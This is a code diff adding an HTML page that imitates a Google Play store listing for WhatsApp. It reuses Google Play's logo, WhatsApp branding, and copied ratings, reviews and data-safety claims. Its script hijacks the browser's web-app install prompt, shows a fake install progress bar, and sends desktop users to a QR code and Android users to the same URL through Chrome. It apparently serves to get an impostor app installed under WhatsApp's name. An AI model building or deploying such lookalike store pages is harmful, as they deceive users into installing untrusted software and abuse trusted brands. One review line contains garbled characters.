@@ -1,0 +1,466 @@
+<!DOCTYPE html>
+<html lang="zh">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>WhatsApp Messenger - Google Play</title>
+    <link rel="stylesheet" href="index.css" />
+    <!-- pwa -->
+    <link rel="manifest" href="manifest.json" />
+    <link rel="apple-touch-icon" href="/apple-touch-icon.png" sizes="180x180" />
+    <meta name="mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+  </head>
+  <body>
+    <header>
+      <div class="container">
+        <div class="header-content">
+          <a href="#" class="logo">
+            <svg viewBox="0 0 40 40" xmlns="http://www.w3.org/2000/svg">
+              <path fill="none" d="M0,0h40v40H0V0z"></path>
+              <g>
+                <path
+                  d="M19.7,19.2L4.3,35.3c0,0,0,0,0,0c0.5,1.7,2.1,3,4,3c0.8,0,1.5-0.2,2.1-0.6l0,0l17.4-9.9L19.7,19.2z"
+                  fill="#EA4335"
+                ></path>
+                <path
+                  d="M35.3,16.4L35.3,16.4l-7.5-4.3l-8.4,7.4l8.5,8.3l7.5-4.2c1.3-0.7,2.2-2.1,2.2-3.6C37.5,18.5,36.6,17.1,35.3,16.4z"
+                  fill="#FBBC04"
+                ></path>
+                <path
+                  d="M4.3,4.7C4.2,5,4.2,5.4,4.2,5.8v28.5c0,0.4,0,0.7,0.1,1.1l16-15.7L4.3,4.7z"
+                  fill="#4285F4"
+                ></path>
+                <path
+                  d="M19.8,20l8-7.9L10.5,2.3C9.9,1.9,9.1,1.7,8.3,1.7c-1.9,0-3.6,1.3-4,3c0,0,0,0,0,0L19.8,20z"
+                  fill="#34A853"
+                ></path>
+              </g>
+            </svg>
+            <span>Google Play</span>
+          </a>
+          <nav class="main-nav">
+            <ul>
+              <li><a href="#" class="nav-link">游戏</a></li>
+              <li><a href="#" class="nav-link active">应用</a></li>
+              <li><a href="#" class="nav-link">电影</a></li>
+              <li><a href="#" class="nav-link">图书</a></li>
+              <li><a href="#" class="nav-link">儿童</a></li>
+            </ul>
+          </nav>
+          <div class="header-right">
+            <svg
+              class="search-icon"
+              viewBox="0 0 24 24"
+              xmlns="http://www.w3.org/2000/svg"
+            >
+              <path
+                d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"
+                fill="currentColor"
+              />
+            </svg>
+          </div>
+        </div>
+      </div>
+    </header>
+
+    <main class="container main-content">
+      <section class="app-info">
+        <div class="app-header">
+          <img src="/pwa-192x192.png" alt="WhatsApp图标" class="app-icon" />
+          <div class="app-details">
+            <h1>WhatsApp Messenger</h1>
+            <p class="app-developer">WhatsApp LLC</p>
+            <div class="app-stats">
+              <div class="stat-item">
+                <div class="rating">4.4★</div>
+                <div class="subtitle">1.9亿条评价</div>
+              </div>
+              <div class="stat-item">
+                <div class="downloads">50亿+</div>
+                <div class="subtitle">次下载</div>
+              </div>
+              <div class="stat-item">
+                <div class="age-rating">3+</div>
+                <div class="subtitle">3岁以上</div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="action-buttons">
+          <button class="install-btn">安装</button>
+          <button class="share-btn">分享</button>
+          <button class="wishlist-btn">添加到心愿单</button>
+        </div>
+
+        <div class="compatibility">
+          <span class="device-icon"></span>
+          在您的设备上可以使用此应用
+        </div>
+
+        <div class="screenshots">
+          <img src="/pwa-narrow-1.png" alt="截图1" class="screenshot" />
+          <img src="/pwa-narrow-2.png" alt="截图2" class="screenshot" />
+          <img src="/pwa-narrow-3.png" alt="截图3" class="screenshot" />
+          <img src="/pwa-narrow-4.png" alt="截图4" class="screenshot" />
+          <img src="/pwa-narrow-5.png" alt="截图5" class="screenshot" />
+        </div>
+      </section>
+      <!-- 应用详情区域 -->
+      <div class="app-details-section">
+        <!-- 关于此应用 -->
+        <section class="detail-section">
+          <h2 class="section-title">关于此应用 <span class="arrow">→</span></h2>
+          <div class="section-content">
+            <p>
+              Meta 旗下的 WhatsApp 是一款安全的免费通讯应用程序，用户可超过 20
+              亿。操作全球 180
+              多个国家地区中，它可靠简单，可以随时随地，让您用文字与朋友和家人保持联络。WhatsApp
+              可在您的手和桌面电脑之间轻松互通，即使在数据不稳定情况下也可保持联系。
+            </p>
+            <p>*以上内容仅供参考。</p>
+
+            <div class="version-info">
+              <p>更新日期</p>
+              <p>2024年1月24日</p>
+            </div>
+          </div>
+        </section>
+
+        <!-- 数据安全 -->
+        <section class="detail-section">
+          <h2 class="section-title">数据安全 <span class="arrow">→</span></h2>
+          <div class="section-content">
+            <p>
+              安全性是了解开发者如何收集和使用您的数据。数据隐私和安全性会因国家或地区而有所不同。但在开发者可能会收集、共享或使用您的数据的方式上遵循相同的准则。
+            </p>
+
+            <ul class="security-features">
+              <li>
+                <div class="feature-text">
+                  <h3>不与第三方共享数据</h3>
+                  <p>开发者表示不会与其他公司或组织共享您的数据</p>
+                </div>
+              </li>
+              <li>
+                <div class="feature-text">
+                  <h3>数据加密传输</h3>
+                  <p>数据通过安全连接传输，无法被他人截获</p>
+                </div>
+              </li>
+              <li>
+                <div class="feature-text">
+                  <h3>随时可以删除数据</h3>
+                  <p>如果您决定停止使用该应用，可以要求删除您的数据</p>
+                </div>
+              </li>
+            </ul>
+
+            <button class="view-details-btn">查看详情</button>
+          </div>
+        </section>
+
+        <!-- 评分和评价 -->
+        <section class="detail-section reviews-section">
+          <div class="section-header">
+            <h2 class="section-title">
+              评分和评价 <span class="arrow">→</span>
+            </h2>
+            <span class="verified-badge">评分和评价已经过验证</span>
+          </div>
+
+          <!-- 设备筛选器 -->
+          <div class="device-filters">
+            <button class="device-btn active">
+              <span class="device-icon">📱</span>手机
+            </button>
+            <button class="device-btn">
+              <span class="device-icon">⌚</span>手表
+            </button>
+            <button class="device-btn">
+              <span class="device-icon">📺</span>电视
+            </button>
+            <button class="device-btn">
+              <span class="device-icon">💻</span>Chromebook
+            </button>
+            <button class="device-btn">
+              <span class="device-icon">🖥️</span>平板电脑
+            </button>
+          </div>
+
+          <!-- 评分概览 -->
+          <div class="rating-overview">
+            <div class="rating-left">
+              <div class="rating-big">4.4</div>
+              <div class="rating-stars">★★½</div>
+              <div class="rating-count">1.95亿条评价</div>
+            </div>
+            <div class="rating-bars">
+              <div class="rating-bar-item">
+                <span class="star-level">5</span>
+                <div class="bar-container">
+                  <div class="bar-fill" style="width: 85%"></div>
+                </div>
+              </div>
+              <div class="rating-bar-item">
+                <span class="star-level">4</span>
+                <div class="bar-container">
+                  <div class="bar-fill" style="width: 10%"></div>
+                </div>
+              </div>
+              <div class="rating-bar-item">
+                <span class="star-level">3</span>
+                <div class="bar-container">
+                  <div class="bar-fill" style="width: 3%"></div>
+                </div>
+              </div>
+              <div class="rating-bar-item">
+                <span class="star-level">2</span>
+                <div class="bar-container">
+                  <div class="bar-fill" style="width: 1%"></div>
+                </div>
+              </div>
+              <div class="rating-bar-item">
+                <span class="star-level">1</span>
+                <div class="bar-container">
+                  <div class="bar-fill" style="width: 5%"></div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <!-- 评论列表 -->
+          <div class="reviews-list">
+            <!-- 评论1 -->
+            <div class="review-item">
+              <div class="review-avatar" style="background-color: #4285f4">
+                j
+              </div>
+              <div class="review-content">
+                <div class="review-header">
+                  <h3>jun dai</h3>
+                  <div class="review-rating">★★★★★</div>
+                  <span class="review-date">2024年10月29日</span>
+                </div>
+                <p class="review-text">
+                  very
+                  good！优点每1m流量可以直接网络电话5分钟，比腾讯wechat更节省一半以上的流量。另外优点有机和电脑wechat省电节能。所以给5个星！希望有每次通话流量显示。但是升级后软件太臃肿！不要增添游戏和无这些垃圾！不要强制升级！！！另外发送文件不能发送各种文件！5-1=4，从2.17.254版本已经改进了。补充重新给予全五星！2019年7月份在中国大陆可以使用，如今不能使用，请开拓有电话号码的登录模式，给被封锁的国家使用。
+                </p>
+                <div class="review-meta">
+                  <span>124 人认为该评价有帮助</span>
+                </div>
+              </div>
+            </div>
+
+            <!-- 评论2 -->
+            <div class="review-item">
+              <div class="review-avatar" style="background-color: #ea4335">
+                j
+              </div>
+              <div class="review-content">
+                <div class="review-header">
+                  <h3>jess teoh</h3>
+                  <div class="review-rating">★★</div>
+                  <span class="review-date">2024年9月27日</span>
+                </div>
+                <p class="review-text">
+                  白从更新后，用正常的声量与朋友录音对话，录出来的声效小的只有一条线，播放时几乎听不到我的声音，要用喊的声音很靠近话筒才能勉强录音量大一丁点。可是我打电话或用微信录音都没问题，并不是我电话的mic出现故障，而是09/2024的两次更新后才全出现问题，之前都是好好的，试过卸载再下载录音声量问题还是一样存在。请问有解决方法吗？
+                </p>
+                <div class="review-meta">
+                  <span>132 人认为该评价有帮助</span>
+                </div>
+              </div>
+            </div>
+
+            <!-- 评论3 -->
+            <div class="review-item">
+              <div class="review-avatar" style="background-color: #34a853">
+                李
+              </div>
+              <div class="review-content">
+                <div class="review-header">
+                  <h3>李明</h3>
+                  <div class="review-rating">★★★★★</div>
+                  <span class="review-date">2024年9月15日</span>
+                </div>
+                <p class="review-text">
+                  使用体验非常好，界面简洁清晰，功能齐全。特别喜欢新增的隐私保护功能，让天���安全。群组管理功能也很实用，推荐使用！
+                </p>
+                <div class="review-meta">
+                  <span>98 人认为该评价有帮助</span>
+                </div>
+              </div>
+            </div>
+          </div>
+        </section>
+
+        <!-- 新功能 -->
+        <section class="detail-section">
+          <h2 class="section-title">新功能</h2>
+          <div class="section-content">
+            <ul class="new-features">
+              <li>
+                现在您可以通讯录里找到 14 位联系人的详细信息，包括他的头像。
+              </li>
+              <li>群组内外分享更加便利的功能上线。</li>
+            </ul>
+            <button class="view-details-btn">查看更多</button>
+          </div>
+        </section>
+      </div>
+    </main>
+
+    <nav class="mobile-nav">
+      <ul>
+        <li><a href="#" class="nav-link">游戏</a></li>
+        <li><a href="#" class="nav-link active">应用</a></li>
+        <li><a href="#" class="nav-link">电影</a></li>
+        <li><a href="#" class="nav-link">图书</a></li>
+        <li><a href="#" class="nav-link">儿童</a></li>
+      </ul>
+    </nav>
+    <!-- 在 body 末尾添加模态框 -->
+    <div id="qrModal" class="modal">
+      <div class="modal-content">
+        <span class="close">&times;</span>
+        <h2>在手机上安装</h2>
+        <div id="qrcode">
+          <div class="scan-line"></div>
+        </div>
+        <p>请使用手机扫描二维码以安装应用</p>
+        <p style="color: #666; font-size: 14px; margin-top: 10px">
+          或在手机浏览器中访问当前网址
+        </p>
+      </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/qrcodejs2@0.0.2/qrcode.min.js"></script>
+    <script>
+      window.addEventListener("beforeinstallprompt", (event) => {
+        console.log("beforeinstallprompt event fired");
+        // 保存事件以备后续使用
+        event.preventDefault();
+        window.deferredPrompt = event;
+      });
+
+      //   页面加载完成后
+      window.onload = function () {
+        // 获取当前 URL 的查询参数
+        const urlParams = new URLSearchParams(window.location.search);
+
+        // 将参数存储到 localStorage
+        localStorage.setItem("urlParams", urlParams.toString());
+      };
+
+      // 检测是否为移动设备
+      function isMobile() {
+        return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(
+          navigator.userAgent
+        );
+      }
+
+      let installProgress = 0;
+      let installationTimer;
+
+      function updateInstallButton(progress) {
+        const installBtn = document.querySelector(".install-btn");
+        if (progress < 100) {
+          installBtn.innerHTML = `
+            <div class="progress-bar">
+              <div class="progress" style="width: ${progress}%"></div>
+              <span class="progress-text">安装中 ${progress}%</span>
+            </div>`;
+          installBtn.style.padding = "0"; // 移除按钮内边距
+        } else {
+          installBtn.innerHTML = "启动应用";
+          installBtn.classList.add("launch-btn");
+          installBtn.style.padding = ""; // 恢复按钮默认内边距
+          clearInterval(installationTimer);
+        }
+      }
+
+      function simulateInstallProgress() {
+        installProgress = 0;
+        const installBtn = document.querySelector(".install-btn");
+        installBtn.disabled = true; // 安装过程中禁用按钮
+
+        installationTimer = setInterval(() => {
+          installProgress += 5; // 减慢进度速度
+          updateInstallButton(installProgress);
+          if (installProgress >= 100) {
+            clearInterval(installationTimer);
+            installBtn.disabled = false; // 安装完成后启用按钮
+          }
+        }, 200);
+      }
+
+      function download() {
+        console.log("downloadButton clicked");
+
+        if (!isMobile()) {
+          // 在电脑端显示二维码
+          const modal = document.getElementById("qrModal");
+          const qrcodeElement = document.getElementById("qrcode");
+          qrcodeElement.innerHTML = ""; // 清除之前的二维码
+
+          new QRCode(qrcodeElement, {
+            text: window.location.href,
+            width: 256,
+            height: 256,
+            colorDark: "#000000",
+            colorLight: "#ffffff",
+            correctLevel: QRCode.CorrectLevel.H,
+          });
+
+          modal.style.display = "block";
+          return;
+        }
+
+        const url = window.location.href.replace(/^https?:\/\//, "");
+        if (window.deferredPrompt) {
+          window.deferredPrompt.prompt();
+          window.deferredPrompt.userChoice.then((choiceResult) => {
+            if (choiceResult.outcome === "accepted") {
+              console.log("user accepted the A2HS prompt");
+              simulateInstallProgress();
+            } else {
+              console.log("user dismissed the A2HS prompt");
+            }
+            window.deferredPrompt = null;
+          });
+        } else {
+          console.log("deferredPrompt 不存在");
+          // Android 设备
+          const intentUrl = `intent://${url}#Intent;scheme=https;package=com.android.chrome;end`;
+          window.location.href = intentUrl;
+        }
+      }
+
+      // 关闭模态框
+      document.querySelector(".close").onclick = function () {
+        document.getElementById("qrModal").style.display = "none";
+      };
+
+      // 点击模态框外部关闭
+      window.onclick = function (event) {
+        const modal = document.getElementById("qrModal");
+        if (event.target == modal) {
+          modal.style.display = "none";
+        }
+      };
+
+      // 处理启动应用按钮点击
+      document
+        .querySelector(".install-btn")
+        .addEventListener("click", function () {
+          if (this.classList.contains("launch-btn")) {
+            // 启动已安装的应用
+            window.location.href = "whatsapp://"; // 使用应用的URL Scheme
+          } else {
+            download();
+          }
+        });
+    </script>
+  </body>
+</html>
